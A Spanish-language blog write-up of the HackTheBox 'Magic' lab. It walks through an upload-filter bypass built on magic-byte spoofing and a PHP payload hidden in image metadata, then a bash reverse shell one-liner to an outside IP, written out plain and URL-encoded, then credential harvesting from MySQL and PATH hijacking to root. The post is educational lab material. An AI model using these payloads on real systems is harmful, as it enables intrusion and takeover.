---
layout      : post
title       : "HackTheBox - Magic"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/bannermagic.png
categories  : [ htb ]
tags        : [ file-upload, magic-bytes, path-hijacking ]
---
Máquina Linux nivel medio. Inspeccionaremos un redireccionamiento web algo locochon, moveremos algunos Magic Bytes, iremos jugando con MySQL y haremos un Path Hijacking.

![magicHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/magicHTB.png)

### TL;RD (Spanish writeup)

> Explico a veces a muy bajo nivel ya que me enfoco en la gente que esta super perdida en este mundo (como yo), por si vez mucho texto ya sabes la razón.

## Enumeración.

Como es habitual, vemos que servicios está corriendo la maquina, en este caso con los parámetros normales el escaneo va lento, así que le agregamos algunos para evitarlo.

```bash
$ nmap -p- --open -v -n --min-rate=5000 10.10.10.185 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los puertos                                                 |
| --open     | Solo los puertos que están abiertos                                       |
| -v         | Permite ver en consola lo que va encontrando                              |
| -n         | Evita que realice Host Discovery, como resolución DNS                     |
| --min-rate | Indica que no queremos hacer peticiones menores al num que pongamos       |
| -oG        | Guarda el output en un archivo con formato grepeable                      |

![nmapInitScan](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/initScan.png)

Con la función que maneja [s4vitar](https://s4vitar.github.io/) podemos extraer los números de los puertos del archivo *initScan*. En este caso se puede ver innecesario, pero si la máquina estuviera corriendo muchos puertos, evitaríamos tener que estar copiando uno a uno los puertos.

![extractPorts](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png)

La ejecución es sencilla, solo se debe agregar la función al archivo `$ ~/.bashrc`

```bash
$ extractPorts initScan
```

![runextractPorts](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/runextractPorts.png)

Ahora un escaneo para verificar las versiones y scripts que están manejando los servicios encontrados, en este caso el SSH(22) y el HTTP(80).

```bash
$ nmap -sC -sV -p22,80 10.10.10.185 -oN portScan
```

| Parámetro | Descripción   |
| ----------|:------------- |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -p        | Escaneo de los puertos obtenidos                       |
| -oN       | Guarda el output en un archivo                         |

![portScan](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/portScan.png)

Bien, nada relevante por ahora, a ver la web que tiene o.O

![magicPage](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/magicPage.png)

Vemos varias imágenes y algunos gif, nada relevante, vamos al apartado `login.php`. Si logramos entrar podremos subir archivos.

![loginphp](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/loginphp.png)

El login no tiene nada interesante. Decido hacer un reconocimiento por fuerza bruta con [dirsearch](https://github.com/maurosoria/dirsearch) a ver si hay algo escondido por ahí.

```bash
$ dirsearch.py -u http://10.10.10.185/ -E -x 403
```

> Con `-x` excluyo las peticiones con el numero del **status code** 403, en este caso las peticiones en las que el servidor se niega a responder

![dirsearchScan](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/dirsearchScan.png)

Bueno acá empieza mi aprendizaje con esta máquina, precisamente vi un directo del master **master** [S4vitar](https://www.twitch.tv/s4vitaar) y toco este tema que mostraré. **En ese momento no tenía ni idea que** Magic **tenía esto**

Al ver la imagen, se ve algo interesante, un archivo `upload.php` con status code **302**, que hace alusión a un *redirect*, lo que quiere decir en este caso que al querer ingresar a `upload.php` nos va a redirigir a `login.php`, así de sencillo, entonces para poder ver `upload.php` se debe evitar el redirect. Con BurpSuite se puede interceptar la trama y modificar el status code, pasando de 302 (redirect al login) a un **200** (en el que el servidor entenderá que todo esta **OK** y podremos ver el contenido de `upload.php`

El procedimiento sería así:

* Habilitar la recepción de respuestas por parte del servidor en BurpSuite

![burpInterceptServer](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/burpInterceptServer.png)

* Interceptar la petición de `upload.php`, oprimir **Forward** para procesar la petición y así obtener la respuesta OK

![burpUpload302](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/burpUpload302.png)

* Como se comentó antes, la idea es cambiar el redirect (302) por un OK (200) para que me deje ver el contenido.

![burpUpload200](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/burpUpload200.png)

Se oprime **Forward** y esto es lo que responde:

![pageUploadphp](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/pageUploadphp.png)

Perfe, veo el contenido de `upload.php`, para solventar el problema de que si queremos volver a visitar `upload.php` nos va a redireccionar de nuevo a `login.php`, podemos asignar una regla en Burp que si recibe una petición en el header con **302** me la cambie por un **200**

![burpMatchReplace](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/burpMatchReplace.png)

Ahora intentaremos subir una imagen `.jpg` con contenido `php`, un simple Remote Command Execution (RCE)

![burplllx1](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/burplllx1.png)

Interceptando la petición con Burp se vería así

![burplllx2](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/burplllx2.png)

Dando clic en **Forward** responde

![burplllx3error](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/burplllx3error.png)

![pagelllx3error](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/pagelllx3error.png)

Pues NO, no es tan fácil. Tomando en cuenta algunos CTF y el nombre de la máquina *Magic* caí en cuenta de los **Magic Numbers** de los archivos. Básicamente son signaturas que establecen que tipo de archivo se está trabajando, se identifican viendo el archivo en formato hexadecimal, el tipo de archivo lo dictaran generalmente los primeros 4 bytes 

* [Pequeña info sobre **magic numbers**](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5). 

Así que cambiando los primeros bytes usando `$ hexeditor` por los correspondientes a un archivo JPEG: 

> JPEG File Interchange Format - .jpg - ff d8 ff e0 

Quedaría así el archivo y su tipo. **Antes:**

![hexeditorbefore](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/hexeditorbefore.png)

**Después**, además agregaremos 4 bytes al inicio (4 puntos) para que no sobreescriba lo que ya tenemos

![hexeditordots](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/hexeditordots.png)

![hexeditorJPEG](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/hexeditorJPEG.png)

Y finalmente tenemos el archivo

![filelllxafterhex](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/filelllxafterhex.png)

A ver si logro pasar el filtro e.e

![pagelllxdone](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/pagelllxdone.png)

OOOKKKOKOKKKK... imagen arriba

Al intentar verla sale error, lo más probable y obvio es que la imagen al no tener contenido de *imagen* y solo código `php` no entiende como interpretarla. El siguiente paso sería subir el `.htaccess` con las instrucciones que le permitan al servidor interpretar los archivos `.jpg` como `php`. En ese caso nos dejaría ver la imagen y ejecutar el código. Pero después de probar no logre burlar el bypass para subir el `.htaccess`. Así que acá volví a aprender algo:

Toda imagen maneja metadatos, que serian los datos dentro del dato, algunos ejemplos de lo que recolecciona sería: el tamaño, fecha de creación, usuario que la modifico o la creo... Creo que ya se entiende la idea.

Consultando por internet, encontré que se pueden usar los metadatos para ejecutar un backdoor. En este caso **dentro de un tag** de los metadatos, puedo ingresar el código php (o lo que sea), que posteriormente el navegador lo interpretará y ejecutará. Usaremos `$ exiftool` para ver y editar los metadatos. 

* [img-upload-rce-cheat-sheet](https://ironhackers.es/herramientas/img-upload-rce-cheat-sheet/)
* [ocultar-codigo-php-en-una-imagen](http://underc0deblog.blogspot.com/2015/04/ocultar-codigo-php-en-una-imagen.html)

##### 1. Obtener cualquier imagen
##### 2. Agregar metadato malicioso

Imagen antes:

![exift23before](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/exift23before.png)

Imagen después de insertar el tag modificado:

![exift23after](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/exift23after.png)

> Va el código php que permitira desde la misma url (GET) pasarle la instrucción a ejecutar en el sistema.

* **__halt_compiler()** hace que el servidor no ejecute los datos de la propia imagen.

##### 3. Cambiar la extensión de la imagen de `.jpg` a `.php.jpg` y subirla

![page23upload](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/page23upload.png)

![page23whoami](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/page23whoami.png)

Perfecto, podemos ejecutar comandos, ahora intentaremos obtener una Shell reversa. 

```bash
http://10.10.10.185/images/uploads/23.php.jpg?cmd=bash -c 'bash -i >& /dev/tcp/10.10.15.69/1233 0>&1'
```

Pero no hace nada, pasando la consulta a URL Encode, quedaría así:

```bash
http://10.10.10.185/images/uploads/23.php.jpg?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.69%2F1233%200%3E%261%27
```

![reverseshellwwwdata](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/reverseshellwwwdata.png)

Listo, estamos dentro :)

Lo siguiente (óptimo, necesario, preferible) es hacer tratamiento de la tty (entorno de entrada y salida de texto), ya que la Shell que tenemos no es completamente interactiva, acá me apoyo de s4vitar (aún no me aprendo los pasos :P)

* [Video de s4vitar explicando](https://www.youtube.com/watch?v=amKkzk-yP14&t=953).

Y ahora a enumerar... Hay varios archivos interesantes en `$ ls /var/www/Magic`.

![rsls_la](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rsls_la.png)

El archivo `db.php5` tiene unas credenciales, que coinciden con el único usuario que hay en el sistema aparte de root: **theseus**.

![rsdbphp5](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rsdbphp5.png)

Pero probando `$ su theseus` no es válida. Así que no va por ahí (por no leer bien el archivo, ya veremos por que), también está el archivo `index.php` el cual tiene la generación del banner inicial con todas las imágenes y además valida si alguna tiene algo relacionado con `php` o demás cosas extrañas.

Pero de los archivos el unico interesante es `db.php5` que claramente nos tiene que servir para algo ya que tiene credenciales.

Revisandolo bien (ahora si) se ve que la conexion la esta haciendo a una base de datos **MySQL**, pero el sistema al hacer `$ mysql` no lo reconoce, asi que primero intente hacer una conexion remota por medio de ssh, pero no servia, despues de buscar formas no encontre nada, asi que simplemente hice el auto completado normal cuando se quiere evitar escribir toda la instruccion o programa, entonces al hacer **`$ mysql + TAB TAB`**, me mostro varias opciones que se pueden usar mediante mysql.

![rsmysqltabtab](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rsmysqltabtab.png)

Hay varias opciones, leyendo en internet sobre algunas interesantes encontré:

```bash
$ mysqlshow -u theseus -p 
```

Nos indicara informacion estructural de la base de datos. (La **-p** hará que la consola pida la pw, en este caso se usa la encontrada en `db.php5`) Siguiendo la estructura de la base de datos encontrada y su tabla, lo que se encontraría se mostraría así

![rsmysqlshow](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rsmysqlshow.png)

Pero de acá no puedo encontrar info que me sirva para explotar el servicio.

Tambien hay un programa que me permite extraer un tipo de backup de la creacion de tablas, data y de la propia base de datos. Como cuando se hace un **export** de una base de datos en MySQL Admin.

```bash
$ mysqldump -u theseus -p Magic
```

Magic, que sería la base de datos encontrada con `$ mysqlshow`.

![rsmysqldump](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rsmysqldump.png)

En las ultimas instrucciones se ve que ingresa a la base de datos un usuario llamado **admin** con una contraseña. Si usamos esa password con el usuario **theseus** logramos obtener una shell con él. 

...

## Escalada de privilegios

Revisando los permisos que tiene `theseus` me indica que no puede correr nada como `$ sudo`. Asi que mirando la info de los grupos relacionados encontre que esta en uno llamado **users**, me dio curiosidad así que si buscamos que archivos del sistema estan catalogados a ese grupo, vemos que solo hay uno, `/bin/sysinfo` (es un archivo que no habia visto antes y que mi sistema base no reconoce). Al ejecutarlo, exactamente trae info (alguna) del sistema. 

Para ver que hace por detras y como puede estar haciendolo se pueden usar varias herramientas (strace, ltrace, strings, cat). Yo mostraré con **strings** ya que se ve claro el vector de ataque.

![rssysinfoid](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rssysinfoid.png)

![rssysinfostrings](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rssysinfostrings.png)

Como se ve esta ejecutando 4 instrucciones, entre ellas `$ fdisk` (ayuda a la gestion y administracion del espacio en el disco duro). Con 3 de esas aplicaciones puedo lograr la explotacion y escalada de privilegios, basicamente por que la tarea esta siendo llamada por el usuario `root`, asi que todas las tareas tendran ese plus. El metodo de explotacion se llama **path hijacking**.

Basicamente lo que hace es que como siempre al ejecutar algun programa el sistema va a buscarlo en algun directorio del path `$ echo $PATH`, entonces (en este ejemplo) pueda que `fdisk` este en `/usr/bin/fdisk`, el atacante se aprovecha de eso agregando en el **path** algun directorio donde **él** tenga un archivo llamado `fdisk` con **instrucciones que hagan lo que el quiera**.

* [Otra explicación: linux-privilege-escalation-using-path-variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/).

Pero como todo se aprende y se entiende en la practica, vamo a darle. La explotacion es sencilla, encontrarla me llevo un tiempito :P 

![rschangepath](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rschangepath.png)

1. Guardar la instruccion que queremos que haga `fdisk`.
2. Darle todos los permisos al archivo.
3. Actualizar el **PATH** para que inserte el directorio donde esta el archivo `fdisk` creado y ademas agregarle el `$PATH` que ya tiene actualmente.
4. Ejecutar el binario `$ /bin/sysinfo` que llamara nuestro `fdisk`.

Pero al ejecutarlo por alguna razón que no entiendo no me muestra el output

![rssysinfofail](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rssysinfofail.png)

Así que diciendole que me haga otra ReverseShell pero ya con el user `root` ejecuta:

![rssysinfodone](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rssysinfodone.png)

Perfectowow soy **root**, acá las flags :)

![rsroot](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rsroot.png)

...

Es mi primera maquina **Medium** pero no se me dificulto tanto. Siguiendo el consejo de s4vitar, hay que darle a cualquier maquina, ya que nos podemos estar perdiendo de mucho aprendizaje, practicando, viendo videos y leyendo mucho he logrado avanzar mas de lo que tenia pensado. A darle duro, a romper todo (las maquinas tambien :P) 

Muy buena maquina, me gusto mucho ademas de experimentar por primera vez con un secuestro de ruta. Encantado de poder brindarle algo de conocimiento a alguien, muchas gracias por querer aprender y no ponerte limites (: